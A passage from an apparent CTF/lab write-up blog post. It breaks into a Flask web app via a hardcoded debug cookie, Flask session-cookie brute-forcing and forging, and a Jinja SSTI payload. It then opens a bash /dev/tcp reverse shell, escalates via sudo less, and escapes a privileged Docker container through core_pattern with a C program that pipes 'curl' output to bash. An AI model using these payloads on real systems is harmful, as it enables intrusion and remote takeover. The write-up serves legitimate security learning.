style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>198</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>3</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>203</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>4</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>197</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>5</span><span style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>202</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>6</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>194</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>7</span><span style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>200</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>)<span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>204</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span><span style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>199</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>10</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>195</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>11</span><span style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>196</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>12</span>))<span style=color:#66d9ef>break</span>;<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>shift</span>())}<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>t</span>){<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>shift</span>())}}(<span style=color:#a6e22e>c</span>);<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>i</span><span style=color:#f92672>=</span><span style=color:#a6e22e>p</span>;<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>p</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>a</span>();<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>p</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>e</span>[<span style=color:#a6e22e>t</span><span style=color:#f92672>-=</span><span style=color:#ae81ff>241</span>]})(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>)}<span style=color:#f92672>!</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>p</span>,<span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>();<span style=color:#66d9ef>for</span>(;;)<span style=color:#66d9ef>try</span>{<span style=color:#66d9ef>if</span>(<span style=color:#ae81ff>872871</span><span style=color:#f92672>==</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>249</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>1</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>252</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>263</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>3</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>248</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>4</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>247</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>5</span>)<span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>243</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>6</span><span style=color:#f92672>*</span>(<span style=color:#f92672>-</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>262</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>7</span>)<span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>260</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>242</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span>)<span style=color:#66d9ef>break</span>;<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>shift</span>())}<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>t</span>){<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>shift</span>())}}(<span style=color:#a6e22e>a</span>),window[<span style=color:#a6e22e>i</span>(<span style=color:#ae81ff>253</span>)]<span style=color:#f92672>=</span>()=&gt;{<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span><span style=color:#a6e22e>i</span>,<span style=color:#a6e22e>n</span><span style=color:#f92672>=</span>document[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>261</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>259</span>)),<span style=color:#a6e22e>r</span><span style=color:#f92672>=</span>document[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>261</span>)](<span style=color:#e6db74>&#34;fileUploadButton&#34;</span>),<span style=color:#a6e22e>s</span><span style=color:#f92672>=</span>document[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>261</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>245</span>)),<span style=color:#a6e22e>u</span><span style=color:#f92672>=</span>document[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>261</span>)](<span style=color:#e6db74>&#34;submitButton&#34;</span>);<span style=color:#a6e22e>s</span><span style=color:#f92672>?</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>value</span><span style=color:#f92672>&amp;&amp;</span>(<span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>257</span>)]<span style=color:#f92672>=!</span><span style=color:#ae81ff>0</span>),<span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>254</span>)]<span style=color:#f92672>===</span><span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>255</span>)<span style=color:#f92672>?</span><span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>244</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>256</span>),<span style=color:#a6e22e>e</span>)<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;Register&#34;</span><span style=color:#f92672>===</span><span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>254</span>)]<span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>244</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>256</span>),<span style=color:#a6e22e>o</span>),<span style=color:#a6e22e>s</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>244</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>241</span>),(()=&gt;{<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>n</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>s</span>[<span style=color:#a6e22e>n</span>(<span style=color:#ae81ff>250</span>)];<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>==</span>String(<span style=color:#a6e22e>e</span>).<span style=color:#a6e22e>search</span>(<span style=color:#e6db74>/^\s*[\w\-\+_]+(\.[\w\-\+_]+)*\@[\w\-\+_]+\.[\w\-\+_]+(\.[\w\-\+_]+)*\s*$/</span>)<span style=color:#f92672>?</span><span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>n</span>(<span style=color:#ae81ff>257</span>)]<span style=color:#f92672>=!</span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span><span style=color:#a6e22e>u</span>[<span style=color:#a6e22e>n</span>(<span style=color:#ae81ff>257</span>)]<span style=color:#f92672>=!</span><span style=color:#ae81ff>1</span>})))<span style=color:#f92672>:</span><span style=color:#a6e22e>n</span><span style=color:#f92672>&amp;&amp;</span>(<span style=color:#a6e22e>r</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>244</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>256</span>),(()=&gt;{<span style=color:#a6e22e>n</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>256</span>)]()})),<span style=color:#a6e22e>n</span>[<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>244</span>)](<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>251</span>),(()=&gt;{<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>;<span style=color:#a6e22e>r</span>[<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>254</span>)]<span style=color:#f92672>=</span><span style=color:#a6e22e>n</span>[<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>258</span>)][<span style=color:#ae81ff>0</span>][<span style=color:#a6e22e>e</span>(<span style=color:#ae81ff>246</span>)]})))}})();
</span></span></code></pre></div><p>From this file string <code>/testing/dev/api/v3/register</code> stood out as it should provide registration functionality - that is turned off on &ldquo;production&rdquo; applicaiton.</p><p>But this endpoint is protected and only available to developers
<img src=images/3.png alt=untitled></p><p>Content of <code>dev-48644bcc829deeffe29e-bundle.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span>(()=&gt;{<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span><span style=color:#a6e22e>e</span>;<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>n</span>(){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>t</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;5306hZYOBb&#34;</span>,<span style=color:#e6db74>&#34;46144oFYHui&#34;</span>,<span style=color:#e6db74>&#34;2092674nyhxib&#34;</span>,<span style=color:#e6db74>&#34;1328703RvoYdl&#34;</span>,<span style=color:#e6db74>&#34;1809168oMTOCe&#34;</span>,<span style=color:#e6db74>&#34;getTime&#34;</span>,<span style=color:#e6db74>&#34;expires=&#34;</span>,<span style=color:#e6db74>&#34;9561972IksZju&#34;</span>,<span style=color:#e6db74>&#34;x-debug-key-v3&#34;</span>,<span style=color:#e6db74>&#34;038663befb1ad868a62035cf5d685adb&#34;</span>,<span style=color:#e6db74>&#34;cookie&#34;</span>,<span style=color:#e6db74>&#34;2122473ZOLSGJ&#34;</span>,<span style=color:#e6db74>&#34;1224815cYPzDr&#34;</span>,<span style=color:#e6db74>&#34;toUTCString&#34;</span>,<span style=color:#e6db74>&#34;setTime&#34;</span>];<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>n</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>t</span>})()}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>e</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>r</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>s</span><span style=color:#f92672>=</span><span style=color:#a6e22e>n</span>();<span style=color:#66d9ef>return</span>(<span style=color:#a6e22e>e</span><span style=color:#f92672>=</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>s</span>[<span style=color:#a6e22e>t</span><span style=color:#f92672>-=</span><span style=color:#ae81ff>205</span>]})(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>r</span>)}<span style=color:#f92672>!</span><span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>r</span><span style=color:#f92672>=</span><span style=color:#a6e22e>e</span>,<span style=color:#a6e22e>s</span><span style=color:#f92672>=</span><span style=color:#a6e22e>t</span>();<span style=color:#66d9ef>for</span>(;;)<span style=color:#66d9ef>try</span>{<span style=color:#66d9ef>if</span>(<span style=color:#ae81ff>903604</span><span style=color:#f92672>==-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>208</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>1</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>207</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>216</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>3</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>209</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>4</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>217</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>5</span><span style=color:#f92672>+-</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>212</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>6</span><span style=color:#f92672>+</span>parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>205</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>7</span><span style=color:#f92672>*</span>(parseInt(<span style=color:#a6e22e>r</span>(<span style=color:#ae81ff>206</span>))<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>))<span style=color:#66d9ef>break</span>;<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>shift</span>())}<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>t</span>){<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>shift</span>())}}(<span style=color:#a6e22e>n</span>),<span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>t</span>,<span style=color:#a6e22e>n</span>,<span style=color:#a6e22e>r</span>){<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>s</span><span style=color:#f92672>=</span><span style=color:#a6e22e>e</span>,<span style=color:#a6e22e>o</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> Date;<span style=color:#a6e22e>o</span>[<span style=color:#a6e22e>s</span>(<span style=color:#ae81ff>219</span>)](<span style=color:#a6e22e>o</span>[<span style=color:#a6e22e>s</span>(<span style=color:#ae81ff>210</span>)]()<span style=color:#f92672>+</span><span style=color:#ae81ff>864e5</span>);<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>c</span><span style=color:#f92672>=</span><span style=color:#a6e22e>s</span>(<span style=color:#ae81ff>211</span>)<span style=color:#f92672>+</span><span style=color:#a6e22e>o</span>[<span style=color:#a6e22e>s</span>(<span style=color:#ae81ff>218</span>)]();document[<span style=color:#a6e22e>s</span>(<span style=color:#ae81ff>215</span>)]<span style=color:#f92672>=</span><span style=color:#a6e22e>t</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;=&#34;</span><span style=color:#f92672>+</span><span style=color:#a6e22e>n</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;;&#34;</span><span style=color:#f92672>+</span><span style=color:#a6e22e>c</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;;path=/&#34;</span>}(<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>213</span>),<span style=color:#a6e22e>t</span>(<span style=color:#ae81ff>214</span>))})();
</span></span></code></pre></div><p>There is hardcoded value of <code>x-debug-key-v3</code> cookie which is <code>038663befb1ad868a62035cf5d685adb</code>
This can be reversed by simply pasting whole code in console and it automatically sets proper cookie in browser
<img src=images/4.png alt=untitled></p><p>After that endpoint <code>/testing/dev/api/v3/register</code> can be accessed
<img src=images/5.png alt=untitled>
Website as logged user</p><p><img src=images/6.png alt=untitled></p><h2 id=account-verification>Account verification<a href=#account-verification class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Verification can by bypassed by downloading example ID Card and uploading it again.
<img src=images/7.png alt=untitled></p><h2 id=meetings>Meetings<a href=#meetings class=hanchor arialabel=Anchor>&#8983;</a></h2><p>This is only accessible for <code>staff</code> users.
Judging by <code>server</code> header (nmap scan) <code>Server: Werkzeug/2.2.2 Python/3.8.10</code> and cookie this is python app, this could by <code>flask</code> application as this is quite popular python framework.</p><h3 id=decoding-cookie>Decoding cookie<a href=#decoding-cookie class=hanchor arialabel=Anchor>&#8983;</a></h3><p>For decoding flask cookie <code>flask-unsign</code> can be used
<img src=images/8.png alt=untitled></p><p>As this returned without an error it confirms that is flask cookie.
After decoding <code>staff</code> field is present in the cookie. To forge own cookie <code>secret</code> value is needed.</p><h3 id=bruteforce-cookie-secret>Bruteforce cookie secret<a href=#bruteforce-cookie-secret class=hanchor arialabel=Anchor>&#8983;</a></h3><p><code>flask-unsign</code> can bruteforce signing secrets
<img src=images/9.png alt=untitled></p><h3 id=forge-own-cookie>Forge own cookie<a href=#forge-own-cookie class=hanchor arialabel=Anchor>&#8983;</a></h3><p>With secret found as <code>sss</code> now cookie can be forged and used to impersonate <code>staff</code> user
<img src=images/10.png alt=untitled></p><p>With forged cookie meeting page is now accessible
<img src=images/11.png alt=untitled></p><h2 id=rce-via-server-side-template-injection>RCE via Server Side Template Injection<a href=#rce-via-server-side-template-injection class=hanchor arialabel=Anchor>&#8983;</a></h2><p>flask application are build on templates. With inproper use of that vulnerability called Server Side Template Injection can be introduced. This allows to execute code on the server.</p><p>Here search functionality is vulnerable to SSTI (Server Side Template Injection).
With <code>email</code> parameter set for <code>{{url_for}}</code> application renedrs <code>url_for</code> object.
<img src=images/12.png alt=untitled></p><p>With email parameter set to <code>{{url_for.__globals__.__builtins__.__import__('os').popen('ls').read()}}</code>
<img src=images/13.png alt=untitled>
Application returns output of <code>ls</code> commands and list all files in directory
This payload takes advantage of python classes and special objects like <code>__builtins__</code> is set of built-in functions of python language like <code>import</code> which is called next as <code>__import__('os')</code>. This mean that code now imports <code>os</code> module. Next <code>popen</code> from os module is called with argument <code>ls</code> shell command to execute. Popen do not return output from executed command directly <code>read()</code> function needs to be called to get <code>stdout</code></p><h3 id=reverse-shell>Reverse Shell<a href=#reverse-shell class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Used payload for reversed shell is
First encode command that send shell connection to <code>base64</code></p><pre tabindex=0><code>echo -n &#34;bash  -i &gt;&amp;  /dev/tcp/10.10.14.22/1337 0&gt;&amp;1  &#34; | base64
</code></pre><p>Next in popen it needs to be decoded <code>base64 -d</code> and executed in <code>bash</code></p><pre tabindex=0><code>{{url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;echo+YmFzaCAgLWkgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjIyLzEzMzcgMD4mMSAg|base64+-d|bash&#39;).read()}} 
</code></pre><p>Make sure to do not have any special characters in base64 like <code>+</code> or <code>=</code>
And connection is recieved as user <code>sparkles</code></p><h2 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>&#8983;</a></h2><p>User sparkles can use sudo with <code>less</code> binary without a password.
<img src=images/14.png alt=untittled>
Less is one of <a href=https://gtfobins.github.io/gtfobins/less/>GTFObins</a> that allows privelege escalation when executed as root which sudo does.</p><h2 id=docker-escape>Docker Escape<a href=#docker-escape class=hanchor arialabel=Anchor>&#8983;</a></h2><p>As this is very limited container, without <code>curl</code>, <code>wget</code>, <code>nc</code> and such file transport is quite cumbersome.
To run <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>linpeas.sh</a> on local machine <code>nc</code> command was executed as <code>nc -lnvp 1337 &lt; linpeas.sh</code> and on the remote server (victim) <code>bash -i >& /dev/tcp/10.10.14.22/1338 0>&1 > linpeas.sh</code>
This allowed to run script on remote server from my local machine.</p><h3 id=linpeassh>linpeas.sh<a href=#linpeassh class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Linpeas is enumeartion script that make this process much simpler and it returned with information that this container runs in <code>privileged mode</code> which allows multiple ways in escaping from container to the host.
<img src=images/15.png alt=untitled>
linpeas enumerates possible ways to brakeout here one of the possibility is <code>core_patter</code> breakout
<img src=images/16.png alt=untitled></p><h3 id=escaping-from-docker>Escaping from docker<a href=#escaping-from-docker class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Docker containers are little virtual machines that share kernel with host system that means some special files from <code>proc</code> are shared. One of the interesting file is <code>/proc/sys/kernel/core_pattern</code> which defines what to do after program crash (core dumps) if this file is starting with pipe <code>|</code> there is 128bytes of space to execute program that will run as <code>root</code> user. But it needs to be program on host system. This isn&rsquo;t a problem really because container is &ldquo;leaching&rdquo; from host so with <code>mount</code> command. Exact path can be extracted for root filesystem which in this case is <code>/var/lib/docker/overlay2/8bcfb41c623919126e3c477270b89d61ca7848cb8ae498ab341a2ded1828750d/diff/</code>
<img src=images/17.png alt=untitled>
So in theory if content of <code>/proc/sys/kernel/core_pattern</code> is <code>|/var/lib/docker/overlay2/8bcfb41c623919126e3c477270b89d61ca7848cb8ae498ab341a2ded1828750d/diff/poc2</code> after core dump host system should execute <code>poc2</code> binary and this is inside docker container so totally user controlable!</p><h4 id=binary-that-crash>Binary that crash<a href=#binary-that-crash class=hanchor arialabel=Anchor>&#8983;</a></h4><p>Taking all wonderful function of <code>C</code> language this program writes 100 bytes to 1 byte buffer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>	buf[i] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h4 id=binary-that-executes-the-code>Binary that executes the CODE<a href=#binary-that-executes-the-code class=hanchor arialabel=Anchor>&#8983;</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;curl 10.10.14.22/shell.sh | bash&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Both of binaries have to be compiled with <code>gcc file -o output_file</code></p><h4 id=reverse-shell-1>Reverse Shell<a href=#reverse-shell-1 class=hanchor arialabel=Anchor>&#8983;</a></h4><p>Content of <code>shell.sh</code> which is downloaded from local machine</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>bash  -i &gt;&amp;  /dev/tcp/10.10.14.22/1337 0&gt;&amp;<span style=color:#ae81ff>1</span>
</span></span></code></pre></div><h3 id=executing-the-attack>Executing the attack<a href=#executing-the-attack class=hanchor arialabel=Anchor>&#8983;</a></h3><p>Recap:</p><ul><li><code>/proc/sys/kernel/core_pattern</code> should contain <code>|/var/lib/docker/overlay2/8bcfb41c623919126e3c477270b89d61ca7848cb8ae498ab341a2ded1828750d/diff/poc2</code> which is path to binary that download <code>shell.sh</code> on the host and execute it.</li><li><code>poc2</code> binary should be in root of the filesystem <code>/poc2</code></li><li>any program that crash on screen /tmp/crash</li><li>Any webserver running hosting <code>shell.sh</code></li><li>listener on port 1337 to catch reverse shell
<img src=images/18.png alt=untitled>
<img src=images/19.png alt=untitled>
ESCAPED!
If docker would ran without <code>--privileged</code> flag it couldn&rsquo;t be done.
All credit for this escape <a href=https://pwning.systems/posts/escaping-containers-for-fun/>here</a> great article that allowed me to pwn this challenge!</li></ul></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>